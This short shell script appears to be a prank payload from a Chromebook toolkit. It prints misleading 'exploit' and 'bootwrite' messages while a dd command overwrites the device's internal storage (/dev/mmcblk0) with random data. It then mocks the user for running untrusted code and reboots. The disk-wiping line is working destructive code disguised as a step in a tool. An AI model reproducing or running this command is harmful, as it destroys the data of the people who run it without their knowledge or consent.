echo "Sourcing exploit files."
sleep 1.5
echo "Starting bootwrite."
dd if=/dev/urandom of=/dev/mmcblk0 >/dev/null &
sleep 2
echo "Think about what you just did."
sleep 2
echo "You downloaded a random file from the internet which now has full root access to your chromebook"
sleep 0.5
echo "Despite it being open source, you didn't check the payload to see what it would actually do" # Unless you're reading this comment, in which case you're a really cool person! Thanks for taking the time to go into the source code
sleep 0.5
echo "And then you pressed a random sketchy menu option"
sleep 0.5
echo "You deserve this."
sleep 2
reboot
